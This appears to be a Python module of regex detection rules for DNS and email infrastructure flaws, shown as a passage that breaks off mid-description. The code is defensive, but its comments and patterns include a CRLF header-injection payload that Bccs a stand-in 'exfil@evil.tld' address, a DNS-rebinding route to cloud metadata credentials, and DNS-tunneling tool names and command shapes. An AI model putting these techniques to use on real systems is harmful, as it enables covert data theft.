"""DNS / email infrastructure attack patterns.

Wave-18 deep-dive distillation round 4, agent G.

Pattern catalogue for DNS and email-infrastructure attack surface convergent
across the corpus surveyed in
`reports/distill-round-4/dns-email-infra.md`:

  * OpsSentinel (nodemailer transport, slack/teams webhooks, webhook
    signature bypass)
  * LinkSentinel (requests.head with allow_redirects=True against
    user-supplied URLs)
  * narthex (safe_fetch / urlopen without DNS pin / IP-range guard;
    pre_bash without dig/dnscat tool names)
  * agentic-threat-hunter (requests.get on env-derived hostnames)

What is NOT here (already shipped under network_exfil_patterns or
auth_flow_patterns — do not duplicate):

  * python-smtp-non-allowlisted-relay  — network_exfil_patterns catches
                                          the smtplib(host) shape; we
                                          add the *TLS-not-enforced*
                                          shape on top.
  * auth-tls-verification-disabled     — auth_flow_patterns catches the
                                          generic verify=False; we add a
                                          mail-transport-specific shape.

What IS here (15 net-new DNS/email rules from the distill report):

  * dns-smtp-tls-not-enforced              (HIGH)        proposal 1
  * dns-smtp-header-injection-unsanitized  (HIGH)        proposal 2
  * dns-rebinding-no-pin                   (HIGH)        proposal 3
  * dns-http-follow-redirects-untrusted    (HIGH)        proposal 4
  * dns-webhook-url-no-allowlist           (HIGH)        proposal 5
  * dns-email-allowlist-no-idna            (HIGH)        proposal 6
  * dns-dkim-weak-rsa-key                  (HIGH)        proposal 7
  * dns-spf-dmarc-permissive               (HIGH)        proposal 8
  * dns-reverse-dns-trust-no-fcrdns        (MEDIUM)      proposal 9
  * dns-webhook-secret-unset-bypass        (CRITICAL)    proposal 10
  * dns-tunneling-tool-shape               (CRITICAL)    proposal 11
  * dns-ci-mail-dns-host-not-vendor        (MEDIUM)      proposal 12
  * dns-email-allowlist-no-nfkc            (HIGH)        proposal 13
  * dns-webhook-toctou-dns-rebind          (MEDIUM)      proposal 14
  * dns-mail-transport-tls-reject-disabled (CRITICAL)    proposal 15

Public surface:

  * Rule(id, name, severity, description, pattern, owasp_asi)
  * RULES — ordered tuple of every rule.
  * scan_text(text) -> list[Finding]
  * Finding(rule_id, line, column, matched_text, severity, description,
            owasp_asi) — frozen NamedTuple.
  * TRUSTED_WEBHOOK_HOSTS   — frozenset of vendor hostnames (allowlist).
  * TRUSTED_MAIL_VENDORS    — frozenset of SMTP vendor suffixes.
  * TRUSTED_SPF_INCLUDES    — frozenset of legitimate SPF include targets.

OWASP ASI mapping used:
  ASI-02 — Data exfiltration / covert channels (DNS-tunneling, header
                                                injection, mail relay
                                                hijack)
  ASI-04 — Insecure output / data leak       (TOCTOU rebind, TLS off)
  ASI-05 — Supply-chain / cross-tenant pivot (SPF/DMARC permissive,
                                              webhook-host hijack,
                                              workflow YAML SMTP host)
  ASI-07 — Authority / authorisation gaps    (webhook-secret unset,
                                              email allowlist bypass)
"""

from __future__ import annotations

import re
from typing import NamedTuple

# ---- Data model ---------------------------------------------------------


class Finding(NamedTuple):
    """A single rule match — same shape as scripts/lib/agent_config_patterns.Finding
    so heartbeat detectors can render either kind uniformly."""

    rule_id: str
    line: int
    column: int
    matched_text: str
    severity: str
    description: str
    owasp_asi: str


class Rule(NamedTuple):
    """A rule definition. Patterns are PRE-COMPILED at module load."""

    id: str
    name: str
    severity: str
    description: str
    pattern: re.Pattern  # noqa: UP006 - keep stdlib name
    owasp_asi: str


def _re(pattern: str) -> re.Pattern:
    """Compile a pattern with MULTILINE+UNICODE (no IGNORECASE by default —
    SMTP / DNS / source-code shapes are case-sensitive: `SMTP_HOST` is not
    `smtp_host`, `Bcc:` header injection requires the literal capital `B`).
    Per-rule overrides pass IGNORECASE explicitly where the shape is genuinely
    case-insensitive (URL scheme, MIME / DNS record name, mail header name
    in a sanitizer test).

    Every pattern in this module is RE2-safe: no backreferences, no
    catastrophic-backtracking alternations, no unbounded nested
    quantifiers. Bridging windows use lazy `[\\s\\S]{0,N}?` with explicit
    upper bounds. The python `re` engine has no RE2 mode but the patterns
    are written so they would compile under RE2."""
    return re.compile(pattern, re.MULTILINE | re.UNICODE)


# ---- Vendor / trusted-host constants ------------------------------------


# Webhook-host allowlist (Slack / Teams / Discord / PagerDuty / Sentry).
# Used by rule 5 to identify legitimate POST destinations.
TRUSTED_WEBHOOK_HOSTS: frozenset[str] = frozenset({
    "hooks.slack.com",
    "outlook.office.com", "outlook.office365.com",
    "discord.com", "discordapp.com",
    "events.pagerduty.com",
    "sentry.io",
    "api.opsgenie.com",
    "api.victorops.com",
    "api.pushover.net",
    "api.pagerduty.com",
})

# Mail-vendor suffixes — known-good SMTP relay endpoints. Wave 17 used the
# raw host form; we use suffix form so CI-YAML rule 12 can do an O(N)
# `endswith` walk without a wildcard library.
TRUSTED_MAIL_VENDORS: frozenset[str] = frozenset({
    "smtp.gmail.com",
    "smtp-mail.outlook.com", "smtp.office365.com",
    "smtp.sendgrid.net",
    "smtp.mailgun.org",
    "smtp.postmarkapp.com",
    "smtp.sparkpostmail.com",
    "smtp.mandrillapp.com",
    "smtp-relay.brevo.com",
    # AWS SES regional prefixes — explicit forms keep the allowlist data-
    # only (no wildcard library at runtime).
    "email-smtp.us-east-1.amazonaws.com",
    "email-smtp.us-west-2.amazonaws.com",
    "email-smtp.eu-west-1.amazonaws.com",
})

# SPF include targets that are widely-known legitimate. Anything else in
# an `include:` is flagged by rule 8.
TRUSTED_SPF_INCLUDES: frozenset[str] = frozenset({
    "_spf.google.com",
    "spf.protection.outlook.com",
    "sendgrid.net",
    "mailgun.org",
    "spf.mandrillapp.com",
    "sparkpostmail.com",
    "spf-a.outlook.com", "spf-b.outlook.com",
    "amazonses.com",
    "_spf.salesforce.com",
})


# ---- 1. dns-smtp-tls-not-enforced (proposal 1) --------------------------


# Stage-A trigger: a nodemailer transport configured with `host` but
# without an `secure:`, `requireTLS:`, or `tls:` field anywhere in the
# transport-options object. The negative-guard is done at file-level so
# the regex stays linear.
#
# We also catch the Python shape: `smtplib.SMTP(host, port)` followed
# by `.login(...)` with no `.starttls()` call in the same file. That
# file-level absence-check is done in scan_text().
_SMTP_TLS_NODEMAILER_TRIGGER = _re(
    r"nodemailer\.createTransport\s*\(\s*\{"
)

# File-level guards — if ANY of these appear ANYWHERE in the file, the
# nodemailer transport is plausibly TLS-enforced and we suppress the hit.
# Deliberately broad to keep FPs low: `requireTLS: true` is the strongest
# signal, but `secure: true` (port 465) and an explicit `tls: {...}` block
# are also fine.
_SMTP_TLS_NODEMAILER_GUARDS: tuple[re.Pattern, ...] = (
    _re(r"\brequireTLS\s*:\s*true\b"),
    _re(r"\bsecure\s*:\s*true\b"),
    _re(r"\btls\s*:\s*\{[^}]*rejectUnauthorized\s*:\s*true"),
    _re(r"\btls\s*:\s*\{[^}]*minVersion\s*:\s*['\"]TLSv1\.[23]['\"]"),
)

# Python smtplib trigger: SMTP(host, port).
_SMTP_TLS_PY_TRIGGER = _re(
    r"\bsmtplib\.SMTP\s*\("
)

# File-level guard — if .starttls() OR SMTP_SSL appears anywhere, suppress.
_SMTP_TLS_PY_GUARDS: tuple[re.Pattern, ...] = (
    _re(r"\.starttls\s*\("),
    _re(r"\bsmtplib\.SMTP_SSL\s*\("),
    _re(r"#\s*smtp-tls-exempt\b"),
)


# ---- 2. dns-smtp-header-injection-unsanitized (proposal 2) --------------


# Mail header / body field constructed via template-string interpolation
# from a variable. The regex matches `subject:`, `from:`, `to:`, `cc:`,
# `bcc:`, `replyTo:` (case-insensitive — it's a key name) and `text:`/
# `html:` fields that contain a `${var}` interpolation.
#
# IGNORECASE because mail-library APIs accept any case for the key name
# (`Subject`, `subject`, `SUBJECT` all work in nodemailer). The downstream
# guard suppresses the hit if the SAME line carries a CRLF-stripping
# sanitizer (`.replace(/[\r\n]/g`, …) or `replace(/\\r|\\n/g`).
_SMTP_HEADER_INJECTION = re.compile(
    # Mail-options field with a template interpolation, JS shape.
    r"\b(?:subject|from|to|cc|bcc|replyTo|reply_to|text|html)\s*:\s*"
    r"[`'\"][^`'\"]*\$\{[^}]+\}",
    re.IGNORECASE | re.MULTILINE | re.UNICODE,
)

# Sanitizer carve-out: if the same line contains a CRLF-stripping call,
# we trust the developer.
_CRLF_SANITIZER_SAMELINE = re.compile(
    r"\.replace\s*\(\s*[/'\"]"
    r"(?:\[\\?r\\?n\]|"           # /[\r\n]/g
    r"\\\\r|\\\\n|"               # \r / \n as escape sequences
    r"\\r|\\n)",
    re.IGNORECASE | re.MULTILINE | re.UNICODE,
)


# ---- 3. dns-rebinding-no-pin (proposal 3) -------------------------------


# Stage-A trigger: an HTTP call (`requests.X(url)`, `urlopen(url)`,
# `axios.X(url)`, `fetch(url)`) where the URL argument is a variable, env
# value, or function arg — NOT a hardcoded `"http..."` literal.
#
# IGNORECASE because some codebases use `Requests` / `Axios` (aliased
# class names) in identifier positions.
_DNS_REBIND_HTTP_CALL = re.compile(
    # Python requests / httpx
    r"\brequests\.(?:get|head|post|put|delete|patch|options)\s*\(\s*"
    r"(?:[a-zA-Z_][\w]*|process\.env\.[A-Z_]+|os\.environ)"
    r"|\bhttpx\.(?:get|head|post|put|delete)\s*\(\s*"
    r"(?:[a-zA-Z_][\w]*|process\.env\.[A-Z_]+|os\.environ)"
    # urllib.request.urlopen
    r"|\burllib\.request\.urlopen\s*\(\s*"
    r"(?:[a-zA-Z_][\w]*|process\.env\.[A-Z_]+|os\.environ)"
    r"|\burlopen\s*\(\s*"
    r"(?:[a-zA-Z_][\w]*|process\.env\.[A-Z_]+|os\.environ)"
    # axios
    r"|\baxios\.(?:get|head|post|put|delete|patch)\s*\(\s*"
    r"(?:[a-zA-Z_$][\w$]*|process\.env\.[A-Z_]+)"
    # fetch
    r"|\bfetch\s*\(\s*"
    r"(?:[a-zA-Z_$][\w$]*|process\.env\.[A-Z_]+)",
    re.MULTILINE | re.UNICODE,
)

# File-level guard — if any DNS-pinning shape exists in the file, we
# trust the developer. The list is intentionally generous: getaddrinfo +
# any RFC1918 / loopback check is the canonical pattern, but a custom
# resolver / safe-fetch / forbiddensites library is also fine.
_DNS_PIN_GUARDS: tuple[re.Pattern, ...] = (
    _re(r"\bsocket\.getaddrinfo\s*\("),
    _re(r"\bdns\.lookup\s*\("),
    _re(r"\bdns\.promises\.lookup\s*\("),
    _re(r"\bipaddress\.ip_address\s*\("),
    _re(r"\bip_address\s*\([^)]+\)\.is_private\b"),
    _re(r"\bforbiddensites\b"),
    _re(r"\bsafe[_-]?fetch\b"),
    _re(r"\bssrf[_-]?guard\b"),
    _re(r"#\s*ssrf-exempt\b"),
)


# ---- 4. dns-http-follow-redirects-untrusted (proposal 4) ----------------


# Stage-A trigger: an HTTP call that allows redirects. Three shapes:
# Python `allow_redirects=True`, JS `maxRedirects: N` (N > 0),
# JS `redirect: 'follow'`. These must co-occur on the same line / same
# call as an HTTP method invocation.
_REDIRECT_FOLLOW_TRIGGER = _re(
    # Python: requests.X(..., allow_redirects=True)
    r"\b(?:requests|httpx)\.(?:get|head|post|put|delete|patch|options)\s*\("
    r"[^)\n]*\ballow_redirects\s*=\s*True\b"
    # JS axios maxRedirects > 0
    r"|\baxios(?:\.[a-z]+)?\s*\([^)\n]*\bmaxRedirects\s*:\s*[1-9]\d*"
    # JS fetch redirect: 'follow'
    r"|\bfetch\s*\([^)\n]*\bredirect\s*:\s*['\"]follow['\"]"
)


# ---- 5. dns-webhook-url-no-allowlist (proposal 5) -----------------------


# Stage-A trigger: an outbound POST/PUT/PATCH to a `*WEBHOOK*` env-var.
# IGNORECASE on the env-name body so `webhook_url` and `WEBHOOK_URL` both
# match, but the call-side identifier is case-sensitive.
_WEBHOOK_NO_ALLOWLIST = re.compile(
    # JS: axios.post(process.env.SLACK_WEBHOOK_URL, ...)
    r"\b(?:axios|got|node-fetch|fetch)\.(?:post|put|patch)\s*\(\s*"
    r"process\.env\.[A-Z][A-Z_0-9]*WEBHOOK[A-Z_0-9]*"
    r"|"
    r"\b(?:axios|got|fetch)\s*\(\s*\{[^}]*url\s*:\s*"
    r"process\.env\.[A-Z][A-Z_0-9]*WEBHOOK[A-Z_0-9]*"
    r"|"
    # Python: requests.post(os.environ['X_WEBHOOK_URL'], ...)
    r"\brequests\.(?:post|put|patch)\s*\(\s*"
    r"(?:os\.environ\[\s*['\"][A-Z_]*WEBHOOK[A-Z_]*['\"]\s*\]"
    r"|os\.environ\.get\s*\(\s*['\"][A-Z_]*WEBHOOK[A-Z_]*['\"]"
    r"|os\.getenv\s*\(\s*['\"][A-Z_]*WEBHOOK[A-Z_]*['\"])",
    re.MULTILINE | re.UNICODE,
)

# File-level guard: hostname allowlist check anywhere in file → suppress.
# We look for `new URL(...).hostname` AND a known-trusted hostname, OR an
# explicit `.endsWith('.slack.com')` / `'hooks.slack.com'` literal.
_WEBHOOK_ALLOWLIST_GUARDS: tuple[re.Pattern, ...] = (
    _re(r"\bnew\s+URL\s*\([^)]+\)\.hostname"),
    _re(r"\bhooks\.slack\.com\b"),
    _re(r"\boutlook\.office\.com\b"),
    _re(r"\bdiscord\.com/api/webhooks\b"),
    _re(r"\bevents\.pagerduty\.com\b"),
    _re(r"\bWEBHOOK_HOST_ALLOWLIST\b"),
    _re(r"\bTRUSTED_WEBHOOK_HOSTS\b"),
    _re(r"#\s*webhook-host-checked\b"),
)


# ---- 6. dns-email-allowlist-no-idna (proposal 6) ------------------------


# Stage-A trigger: an email address being compared against an allowlist
# (==, .endsWith, `in ALLOWED_*`). Negative guard at file-level: if
# `idna.encode`, `punycode.toASCII`, or `validator.isEmail` appears
# anywhere we trust the developer.
_EMAIL_ALLOWLIST_TRIGGER = _re(
    # Python: `if email.endswith('@yourcorp.com'):`
    r"\bemail\s*\.\s*endswith\s*\(\s*['\"]@"
    # Python: `if email in ALLOWED_EMAILS:`
    r"|\bemail\s*in\s+[A-Z][A-Z_]*(?:EMAILS?|ADDRESSES|RECIPIENTS|ADDRS)\b"
    # JS: `if (email.endsWith('@yourcorp.com'))`
    r"|\b(?:email|address|mail|recipient)\s*\.\s*endsWith\s*\(\s*['\"]@"
    # JS strict equality on env-derived destination
    r"|process\.env\.ALERT_EMAIL_TO\s*==="
    r"|process\.env\.[A-Z_]*MAIL[A-Z_]*\s*==="
)

# File-level guard for IDN/punycode handling.
_IDNA_GUARDS: tuple[re.Pattern, ...] = (
    _re(r"\bidna\.encode\s*\("),
    _re(r"\bidna\.decode\s*\("),
    _re(r"\bpunycode\.toASCII\s*\("),
    _re(r"\bpunycode\.encode\s*\("),
    _re(r"\bemail-validator\b"),
    _re(r"\bvalidator\.isEmail\s*\("),
    # email_validator library — both module-attr form and direct-import
    # form. Importing `validate_email` from the library is enough
    # evidence of canonical email handling.
    _re(r"\bemail_validator\b"),
    _re(r"\bvalidate_email\s*\("),
    _re(r"#\s*idna-ok\b"),
)


# ---- 7. dns-dkim-weak-rsa-key (proposal 7) ------------------------------


# Stage-A trigger: an RSA private-key block. RSA modulus length (bits) is
# approximately len(base64)*6. A 2048-bit RSA private key serialised in
# PKCS#1 PEM is ~1700 chars of base64; a 1024-bit key is ~890 chars.
# We require fewer than 1000 base64 chars between BEGIN/END as the
# "weak key" signal (catches 512 and 1024-bit, leaves 2048+ alone).
#
# RE2-safe: `[A-Za-z0-9+/=\s]{0,999}` is bounded — finite and tight enough
# that the python regex engine handles it linearly.
_DKIM_WEAK_RSA_KEY = _re(
    r"-----BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY-----"
    r"[A-Za-z0-9+/=\s]{0,999}"
    r"-----END\s+(?:RSA\s+)?PRIVATE\s+KEY-----"
)

# DKIM context guard — only flag the weak key as DKIM-related if the file
# also references DKIM (env name / config field). Otherwise the same key
# block is just a generic short RSA key and falls under credential rules.
_DKIM_CONTEXT_GUARDS: tuple[re.Pattern, ...] = (
    _re(r"\bDKIM_PRIVATE_KEY\b"),
    _re(r"\bDKIM_KEY\b"),
    _re(r"\bdkim[_-]?selector\b"),
    _re(r"\bdkimSign\b"),
    _re(r"\bdkim_sign\b"),
)


# ---- 8. dns-spf-dmarc-permissive (proposal 8) ---------------------------


# v=spf1 ... +all   (any sender allowed — disaster)
# v=DMARC1; p=none  (no enforcement — disaster on prod)
# v=spf1 ... ?all   (neutral — almost as bad as +all)
#
# IGNORECASE on these because DNS TXT records are case-insensitive, and
# real misconfigurations frequently capitalise inconsistently.
_SPF_DMARC_PERMISSIVE = re.compile(
    # SPF +all (any-sender-allowed)
    r"\bv\s*=\s*spf1\b[^\"\n]{0,400}?\s\+all\b"
    r"|"
    # SPF ?all (neutral — equivalent risk)
    r"\bv\s*=\s*spf1\b[^\"\n]{0,400}?\s\?all\b"
    r"|"
    # DMARC p=none on what looks like production
    r"\bv\s*=\s*DMARC1\b[^\"\n]{0,400}?\bp\s*=\s*none\b",
    re.IGNORECASE | re.MULTILINE | re.UNICODE,
)


# ---- 9. dns-reverse-dns-trust-no-fcrdns (proposal 9) --------------------


# Stage-A trigger: a reverse-DNS lookup followed (within ~10 lines) by a
# trust comparison (.endswith / .startswith / 'in ALLOW...').
#
# Two-arm bounded pattern: lookup + comparator inside the same source
# block.
_REVERSE_DNS_TRIGGER = _re(
    # Python: socket.gethostbyaddr(ip)
    r"\bsocket\.gethostbyaddr\s*\("
    r"|\bdns\.reverse\s*\("
    r"|\bdns\.promises\.reverse\s*\("
)

# Forward-confirmation guard — if `gethostbyname` / `getaddrinfo` /
# `dns.lookup(name)` appears AFTER the gethostbyaddr in the same file, we
# trust the developer (FCrDNS pattern).
_FCRDNS_GUARDS: tuple[re.Pattern, ...] = (
    _re(r"\bsocket\.gethostbyname\s*\("),
    _re(r"\bsocket\.getaddrinfo\s*\("),
    _re(r"\bdns\.lookup\s*\("),
    _re(r"#\s*fcrdns-ok\b"),
)


# ---- 10. dns-webhook-secret-unset-bypass (proposal 10) ------------------


# Direct match: `if (!secret) { ... next() / return ok }` shape.
# IGNORECASE because secret-variable casing varies (`secret`, `Secret`,
# `WEBHOOK_SECRET`). The 200-char bridge is RE2-safe.
_WEBHOOK_SECRET_BYPASS = re.compile(
    # JS: if (!secret) { ... next(); }
    r"\bif\s*\(\s*!\s*"
    r"(?:webhook[_-]?secret|secret|WEBHOOK_SECRET|signingSecret)\s*\)"
    r"[\s\S]{0,200}?"
    r"(?:next\s*\(\s*\)|return\s+next\s*\(\s*\)|return\s+res\.[a-z]+|return\s+true)"
    r"|"
    # Python: if not webhook_secret: return True / return 200
    r"\bif\s+not\s+(?:webhook_secret|secret|WEBHOOK_SECRET)\s*:"
    r"[\s\S]{0,200}?"
    r"(?:return\s+True\b|return\s+200\b|return\s+jsonify|return\s+ok)",
    re.IGNORECASE | re.MULTILINE | re.UNICODE,
)


# ---- 11. dns-tunneling-tool-shape (proposal 11) -------------------------


# Two arms:
#  (a) `dig` / `nslookup` / `host` / `drill` with command-substitution
#      then `.tld` — the classic DNS-tunnel exfil shape.
#  (b) Tunneling-tool binary names: `iodine`, `dnscat`, `dnscat2`,
#      `dnstunnel`, `nstx`, `tcp-over-dns`.
#
# IGNORECASE: legitimate dev usage spells `dig` lowercase; attackers do
# both. Tool names are case-insensitive across known binaries.
_DNS_TUNNEL = re.compile(
    # Arm A: dig/host/nslookup TXT with command substitution
    r"\b(?:dig|nslookup|host|drill|dnsx)\b[^|;&\n]{0,200}"
    r"\$\([^)\n]{1,200}\)[^|;&\n]{0,200}\.[a-zA-Z]{2,}"
    r"|"
    # Arm A': dig TXT $(cmd).<domain>
    r"\bdig\b\s+(?:-t\s+)?TXT\s+[^|;&\n]{0,200}"
    r"\$\([^)\n]{1,200}\)[^|;&\n]{0,200}\.[a-zA-Z]{2,}"
    r"|"
    # Arm B: tunneling-tool binaries
    r"\b(?:iodine|dnscat2?|dnstunnel|dns-tunnel|nstx|tcp-over-dns)\b",
    re.IGNORECASE | re.MULTILINE | re.UNICODE,
)


# ---- 12. dns-ci-mail-dns-host-not-vendor (proposal 12) ------------------


# CI YAML key like `SMTP_HOST: smtp.attacker.example`, `MAIL_HOST:`,
# `DNS_SERVER:`, `RESOLVER:` with a literal value. The literal vs.
# `${{ secrets.* }}` distinction is encoded: if the value is a secrets
# reference we suppress, because then the value isn't trivially editable
# in a PR.
#
# IGNORECASE on the key name and the comparison; vendor-suffix check is
# done in scan_text() against TRUSTED_MAIL_VENDORS / TRUSTED_SPF_INCLUDES
# / generic vendor-suffix list.
_CI_MAIL_DNS_HOST_TRIGGER = re.compile(
    r"^\s*(?:SMTP_HOST|MAIL_HOST|DNS_SERVER|RESOLVER|EMAIL_HOST|"
    r"MAILGUN_SMTP_SERVER|SES_SMTP_HOST)\s*:\s*"
    r"['\"]?([a-zA-Z0-9][a-zA-Z0-9.\-]*\.[a-zA-Z]{2,})['\"]?\s*$",
    re.IGNORECASE | re.MULTILINE | re.UNICODE,
)


# ---- 13. dns-email-allowlist-no-nfkc (proposal 13) ----------------------


# Same trigger shape as rule 6 — an email allowlist comparison. The
# difference: rule 6 is satisfied by punycode/idna conversion (handles
# the cross-script homoglyph case), rule 13 is satisfied by NFKC
# normalisation (handles the combining-character / RTL-override case).
#
# Both rules fire on the same allowlist comparison; the file must show
# BOTH guards to clear BOTH rules. That double-fire is the intent.
_EMAIL_NFKC_GUARDS: tuple[re.Pattern, ...] = (
    _re(r"\bunicodedata\.normalize\s*\(\s*['\"]NFKC['\"]"),
    _re(r"\bunicodedata\.normalize\s*\(\s*['\"]NFC['\"]"),
    _re(r"\.normalize\s*\(\s*['\"]NFKC['\"]"),
    _re(r"\.normalize\s*\(\s*['\"]NFC['\"]"),
    _re(r"#\s*nfkc-ok\b"),
)


# ---- 14. dns-webhook-toctou-dns-rebind (proposal 14) --------------------


# Trigger: a webhook URL used inside what looks like a long-lived loop
# (express handler, asyncio task, setInterval) where DNS is resolved
# each call.
#
# We match a webhook POST/PUT inside a function body that ALSO contains
# a long-lived-event signal — same file, no proximity constraint. The
# file-level negative guard is a custom DNS resolver / pinned IP / boot-
# time cached lookup.
_WEBHOOK_TOCTOU_LONGLIVED_TRIGGER = _re(
    # Same shape as rule 5 but we DON'T file-level-suppress here — even
    # an allowlisted host can be TOCTOU-rebinded.
    r"\b(?:axios|got|node-fetch|fetch)\.(?:post|put|patch)\s*\(\s*"
    r"process\.env\.[A-Z][A-Z_0-9]*WEBHOOK[A-Z_0-9]*"
    r"|"
    r"\brequests\.(?:post|put|patch)\s*\(\s*"
    r"(?:os\.environ\[\s*['\"][A-Z_]*WEBHOOK[A-Z_]*['\"]\s*\]"
    r"|os\.environ\.get\s*\(\s*['\"][A-Z_]*WEBHOOK[A-Z_]*['\"]"
    r"|os\.getenv\s*\(\s*['\"][A-Z_]*WEBHOOK[A-Z_]*['\"])"
)

# Long-lived signal: any of these in the same file means the process is
# running >1 second, so DNS may have rebinded between boot-check and now.
_LONG_LIVED_SIGNALS: tuple[re.Pattern, ...] = (
    _re(r"\bapp\.(?:get|post|put|delete|patch)\s*\("),     # Express handler
    _re(r"\brouter\.(?:get|post|put|delete|patch)\s*\("),
    _re(r"\bsetInterval\s*\("),
    _re(r"\bsetTimeout\s*\("),
    _re(r"\basyncio\.create_task\s*\("),
    _re(r"\basyncio\.run\s*\("),
    _re(r"\bawait\s+asyncio\.sleep\s*\("),
    _re(r"@app\.route\s*\("),
    _re(r"@scheduler\.scheduled_job\b"),
    _re(r"\bschedule\.every\s*\("),
)

# DNS-pin / per-send-resolve guard.
_TOCTOU_PIN_GUARDS: tuple[re.Pattern, ...] = (
    _re(r"\bdns\.lookup\s*\([^)]+\{[^}]*\ball\s*:\s*true"),
    _re(r"\bhttpsAgent\s*:\s*new\s+https\.Agent"),
    _re(r"\blookup\s*:\s*function\s*\("),
    _re(r"\blookup\s*:\s*\([^)]*\)\s*=>"),
    _re(r"#\s*webhook-pinned\b"),
)


# ---- 15. dns-mail-transport-tls-reject-disabled (proposal 15) -----------


# Mail-transport-specific TLS-off shapes. The generic verify=False is in
# auth_flow_patterns; this rule narrows to MAIL transport options where
# the developer disabled cert checking on the outbound MX or webhook leg.
#
# We use the surrounding 200-char bridge to require that the
# rejectUnauthorized/verify-false sits in a transport-options object that
# also names `host`, `auth`, or `transporter` — keeping FP-rate low.
_MAIL_TLS_OFF = _re(
    # nodemailer transport with rejectUnauthorized: false
    r"nodemailer\.createTransport\s*\(\s*\{[\s\S]{0,400}?"
    r"\brejectUnauthorized\s*:\s*false\b"
    r"|"
    # nodemailer with NODE_TLS_REJECT_UNAUTHORIZED override anywhere
    # in file (process-wide; very dangerous)
    r"\bNODE_TLS_REJECT_UNAUTHORIZED\s*=\s*['\"]?0\b"
    r"|"
    # smtplib with unverified SSL context
    r"\bssl\._create_unverified_context\s*\("
    r"|"
    # smtplib SMTP_SSL with ssl.PROTOCOL_TLS without cert check
    r"\bsmtplib\.SMTP_SSL\s*\([^)]*context\s*=\s*ssl\.create_default_context"
    r"\([^)]*check_hostname\s*=\s*False"
)


# ---- The catalogue ------------------------------------------------------


RULES: tuple[Rule, ...] = (
    Rule(
        id="dns-smtp-tls-not-enforced",
        name="SMTP transport without enforced TLS",
        severity="HIGH",
        description=(
            "nodemailer.createTransport({ host, ... }) is configured "
            "without `requireTLS: true`, `secure: true`, or an explicit "
            "`tls: { rejectUnauthorized: true, minVersion: TLSv1.2 }` "
            "block — silently downgrades to plaintext if the relay does "
            "not advertise STARTTLS. Same shape for Python smtplib.SMTP "
            "with no .starttls() call. On-path passive sniff yields the "
            "alert body (which contains scan findings / repo paths / "
            "sometimes tokens). Source: OpsSentinel notifier.js."
        ),
        pattern=_SMTP_TLS_NODEMAILER_TRIGGER,
        owasp_asi="ASI-02",
    ),
    Rule(
        id="dns-smtp-header-injection-unsanitized",
        name="SMTP header / body field with unsanitized interpolation",
        severity="HIGH",
        description=(
            "Mail field (`subject`, `from`, `to`, `cc`, `bcc`, `replyTo`, "
            "`text`, `html`) is constructed via template interpolation "
            "(${var}) from attacker-influenced data (PR title, workflow "
            "name, commit message, scan finding excerpt) with no CRLF "
            "stripping. An attacker who lands a workflow file with "
            "`name: \"benign\\r\\nBcc: exfil@evil.tld\\r\\nfake\"` ships "
            "themselves a copy of every alert. Source: OpsSentinel."
        ),
        pattern=_SMTP_HEADER_INJECTION,
        owasp_asi="ASI-02",
    ),
    Rule(
        id="dns-rebinding-no-pin",
        name="HTTP call to non-literal URL without DNS pin",
        severity="HIGH",
        description=(
            "requests / urlopen / axios / fetch called with a variable "
            "(env, function arg, untrusted markdown link) and no prior "
            "`getaddrinfo` + IP-range guard. DNS rebinding: attacker "
            "serves `attacker.example` with TTL=0, returns "
            "`198.51.100.10` to the first resolve (passes any 'public?' "
            "guard), and `169.254.169[.]254` to the second resolve done "
            "by the HTTP library at connect time. Result: IMDS creds "
            "exfil through the 'safe channel'. Source: LinkSentinel, "
            "narthex safe_fetch."
        ),
        pattern=_DNS_REBIND_HTTP_CALL,
        owasp_asi="ASI-02",
    ),
    Rule(
        id="dns-http-follow-redirects-untrusted",
        name="HTTP allow_redirects=True on user-supplied URL",
        severity="HIGH",
        description=(
            "requests with `allow_redirects=True`, axios with "
            "`maxRedirects > 0`, or fetch with `redirect: 'follow'` on a "
            "URL that came from untrusted markdown / PR description. "
            "The SSRF guard, if any, is usually on the first URL; the "
            "3xx target is what hits IMDS / SSO / local admin port. "
            "Source: LinkSentinel link_validator.py."
        ),
        pattern=_REDIRECT_FOLLOW_TRIGGER,
        owasp_asi="ASI-02",
    ),
    Rule(
        id="dns-webhook-url-no-allowlist",
        name="Webhook URL not pinned to a known provider hostname",
        severity="HIGH",
        description=(
            "axios.post / requests.post against a `*WEBHOOK*` env-var "
            "without an `new URL(...).hostname` allowlist check anywhere "
            "in the file. An attacker who can influence the env (leaked "
            ".env, prompt-injected `.env` write) silently reroutes every "
            "alert (scan findings, repo snippets, sometimes tokens) to "
            "their listener. Source: OpsSentinel notifier.js + server.js."
        ),
        pattern=_WEBHOOK_NO_ALLOWLIST,
        owasp_asi="ASI-05",
    ),
    Rule(
        id="dns-email-allowlist-no-idna",
        name="Email allowlist compared without IDNA / punycode canonicalization",
        severity="HIGH",
        description=(
            "Email address compared against an allowlist (`endsWith` / "
            "`==` / `in ALLOWED_*`) without prior `idna.encode(domain)` / "
            "`punycode.toASCII`. A homoglyph domain "
            "(`@yοurcorp.com` — Greek omicron) bypasses the allowlist; "
            "every 'scan flagged secret X in file Y' alert lands in the "
            "attacker's mailbox. Source: OpsSentinel ALERT_EMAIL_TO."
        ),
        pattern=_EMAIL_ALLOWLIST_TRIGGER,
        owasp_asi="ASI-07",
    ),
    Rule(
        id="dns-dkim-weak-rsa-key",
        name="DKIM RSA private key shorter than 2048 bits",
        severity="HIGH",
        description=(
            "DKIM_PRIVATE_KEY or dkim_sign() context with an embedded "
            "RSA private key shorter than ~1000 base64 chars between "
            "BEGIN/END markers (i.e. 1024-bit RSA or weaker). Modern "
            "guidance is 2048-bit minimum; 1024-bit is forge-feasible "
            "given enough time on a single GPU."
        ),
        pattern=_DKIM_WEAK_RSA_KEY,
        owasp_asi="ASI-07",
    ),
    Rule(
        id="dns-spf-dmarc-permissive",
        name="SPF `+all`/`?all` or DMARC `p=none` on production record",
        severity="HIGH",
        description=(
            "DNS / Terraform / config files containing `v=spf1 ... +all` "
            "(any sender allowed), `v=spf1 ... ?all` (neutral), or "
            "`v=DMARC1; p=none` (no enforcement). Any of these permits "
            "trivial brand impersonation: an attacker forges 'Sentinel: "
            "critical finding — install this hotfix' with a malicious "
            "link, Gmail/Outlook accept (DMARC says 'report only'), user "
            "clicks."
        ),
        pattern=_SPF_DMARC_PERMISSIVE,
        owasp_asi="ASI-05",
    ),
    Rule(
        id="dns-reverse-dns-trust-no-fcrdns",
        name="Reverse-DNS trust without forward-confirmed lookup",
        severity="MEDIUM",
        description=(
            "Code calls `socket.gethostbyaddr(ip)` and uses the returned "
